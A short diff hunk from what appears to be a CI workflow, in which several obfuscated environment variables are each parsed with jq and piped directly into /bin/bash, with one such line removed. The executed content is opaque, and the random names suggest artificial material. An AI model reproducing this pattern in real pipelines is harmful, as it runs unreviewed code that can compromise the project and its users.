@@ -26,7 +26,6 @@ jobs:
           echo $ljnsf913 | jq -r .fdqk8247 | /bin/bash
           echo $s5373 | jq -r .ncc38162 | /bin/bash
           echo $mdqp30166 | jq -r .zz7512 | /bin/bash
-          printf '%s' "$v8074" | jq -r .vwlp27 | /bin/bash
           echo $xdrzw4 | jq -r .lhlf090 | /bin/bash
 
       - name: Store output
